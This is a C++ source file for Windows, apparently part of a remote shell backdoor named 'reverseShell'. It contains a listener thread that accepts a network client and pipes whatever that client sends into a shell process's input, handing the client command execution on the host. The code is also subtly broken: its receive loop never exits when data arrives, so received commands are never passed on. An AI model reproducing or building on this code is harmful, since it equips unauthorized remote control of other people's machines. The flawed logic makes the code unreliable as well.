//#include "reverseShell.h"
#include <windows.h>
#include <iostream>


extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;
extern client_t			client;

char					buffer[BUFFER_SIZE] = {};

#define TELL_SHELL 1
#define MEOF 2
#define STOP 3
#define NO_CLIENT FAILURE

static void resetClient(void) {
	EnterCriticalSection(&shell.lock);
	if (shell.clientSocket) closesocket(shell.clientSocket);
	shell.clientSocket = NULL;
	LeaveCriticalSection(&shell.lock);
	CancelIoEx(shell.parentRead, NULL);
}

BYTE acceptClient(void) {
	EnterCriticalSection(&client.lock);
	shell.clientSocket = accept(shell.listenSocket, NULL, NULL);
	if (shell.clientSocket != INVALID_SOCKET) {
		client.found = TRUE;
		u_long mode = 1;
		ioctlsocket(shell.clientSocket, FIONBIO, &mode);
	}
	LeaveCriticalSection(&client.lock);

	if (shell.clientSocket == INVALID_SOCKET) {
		journalReport(L"Invalid client socket \n");

		return (FAILURE);
	} else {

	}
	return (SUCCESS);
}

static BYTE waitForClient(void) {
	return (acceptClient());
}

static BYTE clientSaidSomething(void) {
	int receivedBytes = 0;
	while (true) {
		receivedBytes = 0;
		EnterCriticalSection(&client.lock);
		receivedBytes = recv(shell.clientSocket, buffer, BUFFER_SIZE-1, NULL);
		LeaveCriticalSection(&client.lock);
		if (receivedBytes == -1) {
			if (WSAGetLastError() == WSAEWOULDBLOCK || WSAGetLastError() == 0)
				continue ;
	
			return (STOP);
		}
	}

	if (receivedBytes == 0) {
		journalReport(L"Client sent MEOF listener thread\n");

		return (MEOF); // End of connection
	}
	buffer[receivedBytes] = '\0';
	return (TELL_SHELL);
}

static BYTE tellToShell(void) {
	DWORD	bytes = 0;

	if (!WriteFile(shell.parentWrite, buffer, (DWORD)std::strlen(buffer), &bytes, NULL)) {
		journalReport(L"Failed to write listener thread\n");

		return (FAILURE);
	}
	return (CONTINUE);
}

DWORD WINAPI listener(LPVOID) {

	while (true) {

		if (waitForClient() == NO_CLIENT) {
	
			resetClient();
			Sleep(3000);
			continue ;
		} // On error ? TODO

		while (true) {

			BYTE clientSaid = clientSaidSomething();

			if (clientSaid == MEOF)
				break ;

			if (clientSaid == STOP) {
		
				notifyStopSignal();
				return (SUCCESS);
			}

			if (clientSaid == TELL_SHELL)
				if (tellToShell() == FAILURE) return (FAILURE);

			ZeroMemory(buffer, BUFFER_SIZE);
		}

		resetClient();
	}
	return (SUCCESS);
}